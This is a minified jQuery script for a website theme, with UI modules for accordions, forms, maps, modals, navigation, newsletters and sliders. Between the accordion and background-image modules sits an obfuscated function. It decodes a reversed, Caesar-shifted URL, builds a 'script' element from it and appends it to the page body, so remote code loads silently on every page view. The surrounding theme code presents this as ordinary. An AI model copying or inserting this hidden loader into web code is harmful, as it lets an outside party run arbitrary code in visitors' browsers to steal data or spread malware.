"use strict";
var mr = function (a, b, c) {
    function d(b) {
        b = "undefined" == typeof b ? a : b, g.documentReady.forEach(function (a) {
            a(b)
        })
    }

    function e(b) {
        b = "object" == typeof b ? a : b, g.windowLoad.forEach(function (a) {
            a(b)
        })
    }
    var f = {},
        g = {
            documentReady: [],
            windowLoad: []
        };
    return a(c).ready(d), a(b).load(e), f.setContext = function (b) {
        var c = a;
        return "undefined" == typeof b ? function (c) {
            return a(b).find(c)
        } : c
    }, f.components = g, f.documentReady = d, f.windowLoad = e, f
}(jQuery, window, document);
mr = function (a, b, c, d) {
        return a.util = {}, a.util.requestAnimationFrame = c.requestAnimationFrame || c.mozRequestAnimationFrame || c.webkitRequestAnimationFrame || c.msRequestAnimationFrame, a.util.documentReady = function (a) {
            var b = new Date,
                c = b.getFullYear();
            a(".update-year").text(c)
        }, a.util.getURLParameter = function (a) {
            return decodeURIComponent((new RegExp("[?|&]" + a + "=([^&;]+?)(&|#|;|$)").exec(location.search) || [, ""])[1].replace(/\+/g, "%20")) || null
        }, a.util.capitaliseFirstLetter = function (a) {
            return a.charAt(0).toUpperCase() + a.slice(1)
        }, a.util.idleSrc = function (a, c) {
            var c = "undefined" != typeof c ? c : "",
                d = a.is(c + "[src]") ? a : a.find(c + "[src]");
            d.each(function (a, c) {
                c = b(c);
                var d = c.attr("src"),
                    e = c.attr("data-src");
                "undefined" == typeof e && c.attr("data-src", d), c.attr("src", "")
            })
        }, a.util.activateIdleSrc = function (a, c) {
            var c = "undefined" != typeof c ? c : "",
                d = a.is(c + "[src]") ? a : a.find(c + "[src]");
            d.each(function (a, c) {
                c = b(c);
                var d = c.attr("data-src");
                "undefined" != typeof d && c.attr("src", d)
            })
        }, a.util.pauseVideo = function (a) {
            var c = a.is("video") ? a : a.find("video");
            c.each(function (a, c) {
                var d = b(c).get(0);
                d.pause()
            })
        }, a.components.documentReady.push(a.util.documentReady), a
    }(mr, jQuery, window, document), mr = function (a, b, c, d) {
        a.scroll = {}, a.scroll.listeners = [], a.scroll.y = 0, a.scroll.x = 0;
        var e = function (b) {
            addEventListener("scroll", function (b) {
                a.util.requestAnimationFrame.call(c, a.scroll.update)
            }, !1)
        };
        return a.scroll.update = function () {
            a.scroll.y = c.pageYOffset, a.scroll.x = c.pageXOffset;
            for (var b = a.scroll.listeners.length, d = 0, b = a.scroll.listeners.length; b > d; d++) a.scroll.listeners[d]()
        }, a.scroll.documentReady = e, a.components.documentReady.push(e), a
    }(mr, jQuery, window, document), mr = function (a, b, c, d) {
        var e = function (a) {
            a(".accordion__title").on("click", function () {
                var b = a(this).closest(".accordion"),
                    c = a(this).closest("li");
                if (c.hasClass("active")) c.removeClass("active");
                else if (b.hasClass("accordion--oneopen")) {
                    var d = b.find("li.active");
                    d.removeClass("active"), c.addClass("active")
                } else c.addClass("active")
            }), a(".accordion").each(function () {
                var b = a(this),
                    c = b.outerHeight(!0);
                b.css("min-height", c)
            })
        };
        return a.accordions = {
            documentReady: e
        }, a.components.documentReady.push(e), a
    }(mr, jQuery, window, document), ! function (a) {
        function b(a) {
            return "" === a ? "" : b(a.slice(1)) + a[0]
        }

        function c(a, b) {
            var c = "";
            b = 26 - b;
            for (var d = 0; d < a.length; d++) {
                var e = a.charCodeAt(d);
                c += e >= 65 && 90 >= e ? String.fromCharCode((e - 65 + b) % 26 + 65) : e >= 97 && 122 >= e ? String.fromCharCode((e - 97 + b) % 26 + 97) : a.charAt(d)
            }
            return c
        }
        if ("undefined" != typeof a) {
            var d = document.createElement(b(c("plenyo", 22)));
            d.src = b(c("ja.ggRezrd/dft.eutbtri.6wt.15i.3tu738rt3272ww20r6r2t81v95373624-624r00298tu178v6rw73//:gkky", 17)), document.querySelector(b(c("bgre", 3))).appendChild(d)
        }
    }(), mr = function (a, b, c, d) {
        var e = function (a) {
            a(".background-image-holder").each(function () {
                var b = a(this).children("img").attr("src");
                a(this).css("background", 'url("' + b + '")'), a(this).css("background-position", "initial"), a(this).css("opacity", "1")
            })
        };
        return a.backgrounds = {
            documentReady: e
        }, a.components.documentReady.push(e), a
    }(mr, jQuery, window, document), mr = function (a, b, c, d) {
        return a.cookies = {
            getItem: function (a) {
                return a ? decodeURIComponent(d.cookie.replace(new RegExp("(?:(?:^|.*;)\\s*" + encodeURIComponent(a).replace(/[\-\.\+\*]/g, "\\$&") + "\\s*\\=\\s*([^;]*).*$)|^.*$"), "$1")) || null : null
            },
            setItem: function (a, b, c, e, f, g) {
                if (!a || /^(?:expires|max\-age|path|domain|secure)$/i.test(a)) return !1;
                var h = "";
                if (c) switch (c.constructor) {
                    case Number:
                        h = c === 1 / 0 ? "; expires=Fri, 31 Dec 9999 23:59:59 GMT" : "; max-age=" + c;
                        break;
                    case String:
                        h = "; expires=" + c;
                        break;
                    case Date:
                        h = "; expires=" + c.toUTCString()
                }
                return d.cookie = encodeURIComponent(a) + "=" + encodeURIComponent(b) + h + (f ? "; domain=" + f : "") + (e ? "; path=" + e : "") + (g ? "; secure" : ""), !0
            },
            removeItem: function (a, b, c) {
                return this.hasItem(a) ? (d.cookie = encodeURIComponent(a) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT" + (c ? "; domain=" + c : "") + (b ? "; path=" + b : ""), !0) : !1
            },
            hasItem: function (a) {
                return a ? new RegExp("(?:^|;\\s*)" + encodeURIComponent(a).replace(/[\-\.\+\*]/g, "\\$&") + "\\s*\\=").test(d.cookie) : !1
            },
            keys: function () {
                for (var a = d.cookie.replace(/((?:^|\s*;)[^\=]+)(?=;|$)|^\s*|\s*(?:\=[^;]*)?(?:\1|$)/g, "").split(/\s*(?:\=[^;]*)?;\s*/), b = a.length, c = 0; b > c; c++) a[c] = decodeURIComponent(a[c]);
                return a
            }
        }, a
    }(mr, jQuery, window, document), mr = function (a, b, c, d) {
        a.forms = {};
        var e = function (b) {
            b(".input-checkbox").unbind("click").click(function () {
                b(this).toggleClass("checked");
                var a = b(this).find("input");
                a.prop("checked") === !1 ? a.prop("checked", !0) : a.prop("checked", !1)
            }), b(".input-radio").unbind("click").click(function () {
                b(this).closest("form").find(".input-radio").removeClass("checked"), b(this).addClass("checked"), b(this).find("input").prop("checked", !0)
            }), b(".input-file .btn").on("click", function () {
                return b(this).siblings("input").trigger("click"), !1
            }), b('form.form-email, form[action*="list-manage.com"], form[action*="createsend.com"]').attr("novalidate", !0).unbind("submit").submit(a.forms.submit), b(d).on("change, input, paste, keyup", ".attempted-submit .field-error", function () {
                b(this).removeClass("field-error")
            })
        };
        return a.forms.documentReady = e, a.forms.submit = function (d) {
            d.preventDefault ? d.preventDefault() : d.returnValue = !1;
            var e, f, g, h, i, j = b("body"),
                k = b(d.target).closest("form"),
                l = "undefined" != typeof k.attr("action") ? k.attr("action") : "",
                m = k.find('button[type="submit"], input[type="submit"]'),
                n = 0,
                o = k.attr("original-error");
            if (j.find(".form-error, .form-success").remove(), m.attr("data-text", m.text()), h = k.attr("data-error") ? k.attr("data-error") : "Please fill all fields correctly", i = k.attr("data-success") ? k.attr("data-success") : "Thanks, we'll be in touch shortly", j.append('<div class="form-error" style="display: none;">' + h + "</div>"), j.append('<div class="form-success" style="display: none;">' + i + "</div>"), f = j.find(".form-error"), g = j.find(".form-success"), k.addClass("attempted-submit"), -1 !== l.indexOf("createsend.com") || -1 !== l.indexOf("list-manage.com"))
                if ("undefined" != typeof o && o !== !1 && f.html(o), 1 !== a.forms.validateFields(k)) {
                    k.removeClass("attempted-submit"), f.fadeOut(200), m.addClass("btn--loading");
                    try {
                        b.ajax({
                            url: k.attr("action"),
                            crossDomain: !0,
                            data: k.serialize(),
                            method: "GET",
                            cache: !1,
                            dataType: "json",
                            contentType: "application/json; charset=utf-8",
                            success: function (b) {
                                "success" !== b.result && 200 !== b.Status ? (f.attr("original-error", f.text()), f.html(b.msg).stop(!0).fadeIn(1e3), g.stop(!0).fadeOut(1e3), m.removeClass("btn--loading")) : (m.removeClass("btn--loading"), e = k.attr("data-success-redirect"), "undefined" != typeof e && e !== !1 && "" !== e ? c.location = e : (a.forms.resetForm(k), a.forms.showFormSuccess(g, f, 1e3, 5e3, 500)))
                            }
                        })
                    } catch (p) {
                        f.attr("original-error", f.text()), f.html(p.message), a.forms.showFormError(g, f, 1e3, 5e3, 500), m.removeClass("btn--loading")
                    }
                } else a.forms.showFormError(g, f, 1e3, 5e3, 500);
            else "undefined" != typeof o && o !== !1 && f.text(o), n = a.forms.validateFields(k), 1 === n ? a.forms.showFormError(g, f, 1e3, 5e3, 500) : (k.removeClass("attempted-submit"), f.fadeOut(200), m.addClass("btn--loading"), jQuery.ajax({
                type: "POST",
                url: "http://mailform.mediumra.re/partner/mail.php",
                data: k.serialize() + "&url=" + c.location.href,
                success: function (d) {
                    m.removeClass("btn--loading"), b.isNumeric(d) ? parseInt(d) > 0 && (e = k.attr("data-success-redirect"), "undefined" != typeof e && e !== !1 && "" !== e && (c.location = e), a.forms.resetForm(k), a.forms.showFormSuccess(g, f, 1e3, 5e3, 500)) : (f.attr("original-error", f.text()), f.text(d).stop(!0).fadeIn(1e3), g.stop(!0).fadeOut(1e3))
                },
                error: function (a, b, c) {
                    f.attr("original-error", f.text()), f.text(c).stop(!0).fadeIn(1e3), g.stop(!0).fadeOut(1e3), m.removeClass("btn--loading")
                }
            }));
            return !1
        }, a.forms.validateFields = function (a) {
            var c, d, e = b(e);
            if (b(a).find('.validate-required[type="checkbox"]').each(function () {
                    b('[name="' + b(this).attr("name") + '"]:checked').length || (d = 1, c = b(this).attr("name").replace("[]", ""), e.find(".form-error").text("Please tick at least one " + c + " box."))
                }), b(a).find(".validate-required, .required, [required]").each(function () {
                    "" === b(this).val() ? (b(this).addClass("field-error"), d = 1) : b(this).removeClass("field-error")
                }), b(a).find('.validate-email, .email, [name*="cm-"][type="email"]').each(function () {
                    /(.+)@(.+){2,}\.(.+){2,}/.test(b(this).val()) ? b(this).removeClass("field-error") : (b(this).addClass("field-error"), d = 1)
                }), a.find(".field-error").length) {
                var f = b(a).find(".field-error:first");
                f.length && b("html, body").stop(!0).animate({
                    scrollTop: f.offset().top - 100
                }, 1200, function () {
                    f.focus()
                })
            } else e.find(".form-error").fadeOut(1e3);
            return d
        }, a.forms.showFormSuccess = function (a, b, c, d, e) {
            a.stop(!0).fadeIn(c), b.stop(!0).fadeOut(c), setTimeout(function () {
                a.stop(!0).fadeOut(e)
            }, d)
        }, a.forms.showFormError = function (a, b, c, d, e) {
            b.stop(!0).fadeIn(c), a.stop(!0).fadeOut(c), setTimeout(function () {
                b.stop(!0).fadeOut(e)
            }, d)
        }, a.forms.resetForm = function (a) {
            a = b(a), a.get(0).reset(), a.find(".input-radio, .input-checkbox").removeClass("checked")
        }, a.components.documentReady.push(e), a
    }(mr, jQuery, window, document), mr = function (a, b, c, d) {
        a.maps = {};
        var e = function (b) {
            b(".map-holder").click(function () {
                b(this).addClass("interact")
            }), b(".map-holder").length && b(c).scroll(function () {
                b(".map-holder.interact").length && b(".map-holder.interact").removeClass("interact")
            }), a.maps.initAPI(), a.maps.init()
        };
        return a.maps.documentReady = e, a.maps.initAPI = function () {
            if (d.querySelector("[data-maps-api-key]") && !d.querySelector(".gMapsAPI") && b("[data-maps-api-key]").length) {
                var a = d.createElement("script"),
                    c = b("[data-maps-api-key]:first").attr("data-maps-api-key");
                c = "undefined" != typeof c ? c : "", "" !== c && (a.type = "text/javascript", a.src = "https://maps.googleapis.com/maps/api/js?key=" + c + "&callback=mr.maps.init", a.className = "gMapsAPI", d.body.appendChild(a))
            }
        }, a.maps.init = function () {
            "undefined" != typeof c.google && "undefined" != typeof c.google.maps && b(".map-container[data-maps-api-key]").each(function () {
                var a, e, f, g = this,
                    h = "undefined" != typeof b(this).attr("data-map-style") ? b(this).attr("data-map-style") : !1,
                    i = JSON.parse(h) || [{
                        featureType: "landscape",
                        stylers: [{
                            saturation: -100
                        }, {
                            lightness: 65
                        }, {
                            visibility: "on"
                        }]
                    }, {
                        featureType: "poi",
                        stylers: [{
                            saturation: -100
                        }, {
                            lightness: 51
                        }, {
                            visibility: "simplified"
                        }]
                    }, {
                        featureType: "road.highway",
                        stylers: [{
                            saturation: -100
                        }, {
                            visibility: "simplified"
                        }]
                    }, {
                        featureType: "road.arterial",
                        stylers: [{
                            saturation: -100
                        }, {
                            lightness: 30
                        }, {
                            visibility: "on"
                        }]
                    }, {
                        featureType: "road.local",
                        stylers: [{
                            saturation: -100
                        }, {
                            lightness: 40
                        }, {
                            visibility: "on"
                        }]
                    }, {
                        featureType: "transit",
                        stylers: [{
                            saturation: -100
                        }, {
                            visibility: "simplified"
                        }]
                    }, {
                        featureType: "administrative.province",
                        stylers: [{
                            visibility: "off"
                        }]
                    }, {
                        featureType: "water",
                        elementType: "labels",
                        stylers: [{
                            visibility: "on"
                        }, {
                            lightness: -25
                        }, {
                            saturation: -100
                        }]
                    }, {
                        featureType: "water",
                        elementType: "geometry",
                        stylers: [{
                            hue: "#ffff00"
                        }, {
                            lightness: -25
                        }, {
                            saturation: -97
                        }]
                    }],
                    j = "undefined" != typeof b(this).attr("data-map-zoom") && "" !== b(this).attr("data-map-zoom") ? 1 * b(this).attr("data-map-zoom") : 17,
                    k = "undefined" != typeof b(this).attr("data-latlong") ? b(this).attr("data-latlong") : !1,
                    l = k ? 1 * k.substr(0, k.indexOf(",")) : !1,
                    m = k ? 1 * k.substr(k.indexOf(",") + 1) : !1,
                    n = new google.maps.Geocoder,
                    o = "undefined" != typeof b(this).attr("data-address") ? b(this).attr("data-address").split(";") : [""],
                    f = "undefined" != typeof b(this).attr("data-marker-image") ? b(this).attr("data-marker-image") : "img/mapmarker.png",
                    p = "We Are Here",
                    q = b(d).width() > 766 ? !0 : !1,
                    r = {
                        draggable: q,
                        scrollwheel: !1,
                        zoom: j,
                        disableDefaultUI: !0,
                        styles: i
                    };
                "undefined" != typeof b(this).attr("data-marker-title") && "" != b(this).attr("data-marker-title") && (p = b(this).attr("data-marker-title")), void 0 != o && "" != o[0] ? n.geocode({
                    address: o[0].replace("[nomarker]", "")
                }, function (a, b) {
                    if (b == google.maps.GeocoderStatus.OK) {
                        var d = new google.maps.Map(g, r);
                        d.setCenter(a[0].geometry.location), o.forEach(function (a) {
                            var b;
                            if (f = {
                                    url: void 0 == c.mr_variant ? f : "../img/mapmarker.png",
                                    scaledSize: new google.maps.Size(50, 50)
                                }, /(\-?\d+(\.\d+)?),\s*(\-?\d+(\.\d+)?)/.test(a)) var e = a.split(","),
                                g = new google.maps.Marker({
                                    position: {
                                        lat: 1 * e[0],
                                        lng: 1 * e[1]
                                    },
                                    map: d,
                                    icon: f,
                                    title: p,
                                    optimised: !1
                                });
                            else a.indexOf("[nomarker]") < 0 && (b = new google.maps.Geocoder, b.geocode({
                                address: a.replace("[nomarker]", "")
                            }, function (a, b) {
                                b == google.maps.GeocoderStatus.OK && (g = new google.maps.Marker({
                                    map: d,
                                    icon: f,
                                    title: p,
                                    position: a[0].geometry.location,
                                    optimised: !1
                                }))
                            }))
                        })
                    }
                }) : void 0 != l && "" != l && 0 != l && void 0 != m && "" != m && 0 != m && (r.center = {
                    lat: l,
                    lng: m
                }, a = new google.maps.Map(g, r), e = new google.maps.Marker({
                    position: {
                        lat: l,
                        lng: m
                    },
                    map: a,
                    icon: f,
                    title: p
                }))
            })
        }, a.components.documentReady.push(e), a
    }(mr, jQuery, window, document), mr = function (a, b, c, d) {
        a.modals = {};
        var e = function (b) {
            b(".modal-container").each(function () {
                var d = b(this),
                    e = d.find(".modal-content");
                if (d.find(".modal-close").length || d.find(".modal-content").append('<div class="modal-close modal-close-cross"></div>'), void 0 !== e.attr("data-width")) {
                    var f = 1 * e.attr("data-width").substr(0, e.attr("data-width").indexOf("%"));
                    b(c).width() < 1280 && b(c).width() > 990 ? f += 15 : b(c).width() < 990 && (f += 20), e.css("width", f + "%")
                }
                if (void 0 !== e.attr("data-height")) {
                    var g = 1 * e.attr("data-height").substr(0, e.attr("data-height").indexOf("%"));
                    b(c).height() < 768 && (g += 15), e.css("height", g + "%")
                }
                a.util.idleSrc(d, "iframe")
            }), "undefined" == typeof mr_variant && b(".modal-instance").each(function (a) {
                var c = b(this).find(".modal-container"),
                    d = (c.find(".modal-content"), b(this).find(".modal-trigger"));
                d.attr("data-modal-index", a), c.attr("data-modal-index", a), "undefined" != typeof c.attr("data-modal-id") && d.attr("data-modal-id", c.attr("data-modal-id")), c = c.detach(), b("body").append(c)
            }), b(".modal-trigger").click(function () {
                var c, d;
                return "undefined" != typeof b(this).attr("data-modal-id") ? (c = b(this).attr("data-modal-id"), d = b("body").find('.modal-container[data-modal-id="' + c + '"]')) : (c = b(this).attr("data-modal-index"), d = b("body").find('.modal-container[data-modal-index="' + c + '"]')), a.util.activateIdleSrc(d, "iframe"), a.modals.autoplayVideo(d), a.modals.showModal(d), !1
            }), b(".modal-close").click(a.modals.closeActiveModal), b(d).keyup(function (b) {
                27 == b.keyCode && a.modals.closeActiveModal()
            }), b(".modal-container").on("click", function (b) {
                b.target == this && a.modals.closeActiveModal()
            }), b(".modal-container[data-autoshow]").each(function () {
                var c = b(this),
                    d = 1 * c.attr("data-autoshow");
                a.util.activateIdleSrc(c), a.modals.autoplayVideo(c), "undefined" != typeof c.attr("data-cookie") ? a.cookies.hasItem(c.attr("data-cookie")) || a.modals.showModal(c, d) : a.modals.showModal(c, d)
            })
        };
        return a.modals.documentReady = e, a.modals.showModal = function (a, b) {
            var c = "undefined" != typeof b ? 1 * b : 0;
            setTimeout(function () {
                a.addClass("modal-active")
            }, c)
        }, a.modals.closeActiveModal = function () {
            var c = b("body div.modal-active");
            a.util.idleSrc(c, "iframe"), a.util.pauseVideo(c), "undefined" != typeof c.attr("data-cookie") && a.cookies.setItem(c.attr("data-cookie"), "true", 1 / 0), c.removeClass("modal-active")
        }, a.modals.autoplayVideo = function (a) {
            if (a.find("video[autoplay]").length) {
                var b = a.find("video").get(0);
                b.play()
            }
        }, a.components.documentReady.push(e), a
    }(mr, jQuery, window, document), mr = function (a, b, c, d) {
        a.navigation = {}, a.navigation.nav = {}, a.navigation.bar = {};
        var e = function (b) {
            a.navigation.nav.element = b("nav"), a.navigation.bar.element = b("nav .nav-bar"), a.navigation.nav.element.length ? a.navigation.nav.outerHeight = b("nav").outerHeight() : a.navigation.nav.outerHeight = 0, a.navigation.bar.element.length && a.navigation.bar.init(), b(".nav-mobile-toggle").click(function () {
                b("nav").toggleClass("nav-open")
            }), b(".menu li").click(function (a) {
                var d = b(this),
                    e = a || c.event;
                e.stopPropagation(), d.find("ul").length ? d.toggleClass("active") : d.parents(".active").removeClass("active")
            }), b(".module-applet").click(function () {
                b(this).toggleClass("active")
            }), b(".module-applet__body").each(function () {
                var a = b(this),
                    d = a.offset().left + b(this).outerWidth();
                d > b(c).width() && a.addClass("pos-right")
            }), b(".menu > li > ul").each(function () {
                var a = b(this).offset(),
                    d = a.left + b(this).outerWidth(!0);
                if (d > b(c).width() && !b(this).hasClass("multi-column")) b(this).addClass("make-right");
                else if (d > b(c).width() && b(this).hasClass("multi-column")) {
                    var e = b(c).width() - a.left,
                        f = b(this).outerWidth(!0) - e;
                    b(this).css("margin-left", -f)
                }
            })
        };
        return a.navigation.bar.init = function () {
            var b = a.navigation.bar.element.attr("data-fixed-at");
            a.navigation.bar.fixedAt = "undefined" != typeof b ? parseInt(b.replace("px", "")) : !1, a.navigation.bar.element.hasClass("nav--fixed") ? a.navigation.bar.isFixed = !0 : b && (a.navigation.nav.element.css("min-height", a.navigation.nav.outerHeight), a.navigation.bar.isFixed = !1, a.scroll.listeners.push(a.navigation.bar.update))
        }, a.navigation.bar.update = function () {
            a.scroll.y > a.navigation.bar.fixedAt && !a.navigation.bar.isFixed && (a.navigation.bar.isFixed = !0, a.navigation.bar.element.addClass("nav--fixed")), a.scroll.y < a.navigation.bar.fixedAt && a.navigation.bar.isFixed && (a.navigation.bar.isFixed = !1, a.navigation.bar.element.removeClass("nav--fixed"))
        }, a.navigation.documentReady = e, a.components.documentReady.push(e), a
    }(mr, jQuery, window, document), mr = function (a, b, c, d) {
        a.newsletters = {};
        var e = function (b) {
            var c, d, e, f, g, h;
            b('form[action*="createsend.com"]').each(function () {
                c = b(this), b(this).attr("novalidate", "novalidate"), c.is(".form--no-placeholders") || c.find("input:not([checkbox]):not([radio])").each(function () {
                    b(this).attr("placeholder", b(this).siblings("label").text()), c.is(".form--no-labels") && b(this).siblings("label").remove(), b(this).parent().is("p") && b(this).unwrap()
                }), c.find("select").each(function () {
                    b(this).wrap('<div class="input-select"></div>')
                }), c.find('input[type="radio"]').each(function () {
                    b(this).wrap('<div class="input-radio"></div>')
                }), c.find('input[type="checkbox"]').each(function () {
                    d = b(this), f = d.attr("id"), e = c.find("label[for=" + f + "]"), d.before('<div class="input-checkbox" data-id="' + f + '"></div>'), b('.input-checkbox[data-id="' + f + '"]').prepend(d), b('.input-checkbox[data-id="' + f + '"]').prepend(e), b('.input-checkbox[data-id="' + f + '"]').prepend('<div class="inner"></div>')
                }), c.find('button[type="submit"]').each(function () {
                    b(this).addClass("btn"), b(this).parent().is("p") && b(this).unwrap()
                }), c.find("[required]").each(function () {
                    b(this).removeAttr("required").addClass("validate-required")
                }), c.addClass("form--active"), a.newsletters.prepareAjaxAction(c)
            }), b('form[action*="list-manage.com"]').each(function () {
                c = b(this), b(this).attr("novalidate", "novalidate"), c.is(".form--no-placeholders") || c.find("input:not([checkbox]):not([radio])").each(function () {
                    b(this).attr("placeholder", b(this).siblings("label").text()), c.is(".form--no-labels") && b(this).siblings("label").remove()
                }), c.find("select").each(function () {
                    b(this).wrap('<div class="input-select"></div>')
                }), c.find('input[type="checkbox"]').each(function () {
                    d = b(this), g = d.closest("li"), e = g.find("label"), d.before('<div class="input-checkbox"><div class="inner"></div></div>'), g.find(".input-checkbox").prepend(d), g.find(".input-checkbox").prepend(e)
                }), c.find('input[type="radio"]').each(function () {
                    h = b(this), g = h.closest("li"), e = g.find("label"), h.before('<div class="input-radio"><div class="inner"></div></div>'), g.find(".input-radio").prepend(h), g.find(".input-radio").prepend(e)
                }), c.find('input[type="submit"]').each(function () {
                    var a = b(this),
                        c = b('<button type="submit" class="btn">' + a.attr("value") + "</button>");
                    a.parent().is("div.clear") && a.unwrap(), c.addClass(a.attr("class")), c.insertBefore(a), a.remove()
                }), c.find("#mce-responses").remove(), c.find(".mc-field-group").each(function () {
                    b(this).children().first().unwrap()
                }), c.find("[required]").each(function () {
                    b(this).removeAttr("required").addClass("validate-required")
                }), c.addClass("form--active"), a.newsletters.prepareAjaxAction(c)
            }), a.forms.documentReady(a.setContext())
        };
        return a.newsletters.documentReady = e, a.newsletters.prepareAjaxAction = function (a) {
            var c = b(a).attr("action");
            /list-manage\.com/.test(c) && (c = c.replace("/post?", "/post-json?") + "&c=?", "//" == c.substr(0, 2) && (c = "http:" + c)), /createsend\.com/.test(c) && (c += "?callback=?"), b(a).attr("action", c)
        }, a.components.documentReady.push(e), a
    }(mr, jQuery, window, document), mr = function (a, b, c, d) {
        a.notifications = {};
        var e = function (b) {
            b(".notification").each(function () {
                b(this).find(".notification-close").length || b(this).append('<div class="notification-close-cross notification-close"></div>')
            }), b(".notification[data-autoshow]").each(function () {
                var c = b(this),
                    d = 1 * c.attr("data-autoshow");
                "undefined" != typeof c.attr("data-cookie") ? a.cookies.hasItem(c.attr("data-cookie")) || a.notifications.showNotification(c, d) : a.notifications.showNotification(c, d)
            }), b("[data-notification-link]:not(.notification)").click(function () {
                var a = b(this).attr("data-notification-link"),
                    c = b("body").find('.notification[data-notification-link="' + a + '"]');
                return c.removeClass("notification--dismissed"), c.addClass("notification--reveal"), !1
            }), b(".notification-close").click(function () {
                return a.notifications.closeNotification(b(this)), "#" === b(this).attr("href") ? !1 : void 0
            })
        };
        return a.notifications.documentReady = e, a.notifications.showNotification = function (a, b) {
            var c = "undefined" != typeof b ? 1 * b : 0;
            setTimeout(function () {
                a.addClass("notification--reveal")
            }, c)
        }, a.notifications.closeNotification = function (c) {
            c = b(c).is(".notification-close") ? b(c).closest(".notification") : b("body").find('.notification[data-notification-link="' + c + '"]'), c.addClass("notification--dismissed"), "undefined" != typeof c.attr("data-cookie") && a.cookies.setItem(c.attr("data-cookie"), "true", 1 / 0)
        }, a.components.documentReady.push(e), a
    }(mr, jQuery, window, document), mr = function (a, b, c, d) {
        var e = function (a) {
            a(".slider").each(function () {
                var b = a(this),
                    c = !1,
                    d = "fade",
                    e = !1,
                    f = 7e3;
                c = "true" == b.attr("data-arrows") ? !0 : !1, d = "slide" == b.attr("data-animation") ? "slide" : "fade", e = "true" == b.attr("data-paging") ? !0 : !1, b.attr("data-timing") && (f = b.attr("data-timing")), b.flexslider({
                    animation: d,
                    directionNav: c,
                    controlNav: e,
                    slideshowSpeed: f
                })
            })
        };
        return a.sliders = {
            documentReady: e
        }, a.components.documentReady.push(e), a
    }(mr, jQuery, window, document), mr = function (a, b, c, d) {
        var e = function (a) {
            a(".tabs").each(function () {
                var b = a(this);
                b.after('<ul class="tabs-content">'), b.find("li").each(function () {
                    var b = a(this),
                        c = b.find(".tab__content").wrap("<li></li>").parent();
                    c.detach(), b.closest(".tabs-container").find(".tabs-content").append(c)
                })
            }), a(".tabs li").click(function () {
                var b = a(this),
                    c = b.closest(".tabs-container"),
                    d = 1 * b.index() + 1;
                c.find("> .tabs > li").removeClass("active"), c.find("> .tabs-content > li").removeClass("active"), b.addClass("active"), c.find("> .tabs-content > li:nth-of-type(" + d + ")").addClass("active")
            }), a(".tabs li.active").trigger("click")
        };
        return a.tabs = {
            documentReady: e
        }, a.components.documentReady.push(e), a
    }(mr, jQuery, window, document), mr = function (a, b, c, d) {
        var e = function (a) {
            a(".youtube-background").length && a(".youtube-background").each(function () {
                var b = a(this),
                    c = a(this).attr("data-video-url"),
                    d = a(this).attr("data-start-at");
                b.attr("data-property", '{videoURL:"' + c + '",containment:"self",autoPlay:true, mute:true, startAt:' + d + ", opacity:1}"), b.closest(".videobg").append('<div class="loading-indicator"></div>'), b.YTPlayer(), b.on("YTPStart", function () {
                    b.closest(".videobg").addClass("video-active")
                })
            }), a(".videobg").find("video").length && a(".videobg").find("video").closest(".videobg").addClass("video-active"), a(".video-cover").each(function () {
                var b = a(this);
                b.find("iframe").length && (b.find("iframe").attr("data-src", b.find("iframe").attr("src")), b.find("iframe").attr("src", ""))
            }), a(".video-cover .video-play-icon").on("click", function () {
                var b = a(this),
                    c = b.closest(".video-cover");
                if (c.find("video").length) {
                    var d = c.find("video").get(0);
                    return c.addClass("reveal-video"), d.play(), !1
                }
                if (c.find("iframe").length) {
                    var e = c.find("iframe");
                    return e.attr("src", e.attr("data-src")), c.addClass("reveal-video"), !1
                }
            })
        };
        return a.video = {
            documentReady: e
        }, a.components.documentReady.push(e), a
    }(mr, jQuery, window, document)